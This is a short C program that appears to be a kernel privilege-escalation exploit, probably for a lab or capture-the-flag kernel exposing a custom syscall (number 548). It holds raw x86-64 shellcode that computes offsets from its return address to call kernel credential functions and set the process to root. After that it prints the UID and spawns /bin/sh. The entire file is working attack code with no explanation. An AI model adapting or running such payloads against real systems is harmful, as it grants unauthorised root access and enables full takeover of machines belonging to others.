#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

void main() {

    char mald[] = "\x48\x8B\x04\x24\x48\x05\x9E\x10\x01\x00\x48\x31\xFF\xFF\xD0\x48\x89\xC7\x48\x8B\x04\x24\x48\x05\xFE\x0D\x01\x00\xFF\xD0\xC3";

    syscall(548, mald, sizeof(mald));
    
    printf("UID: %d\n", getuid());
    
    system("/bin/sh");

}
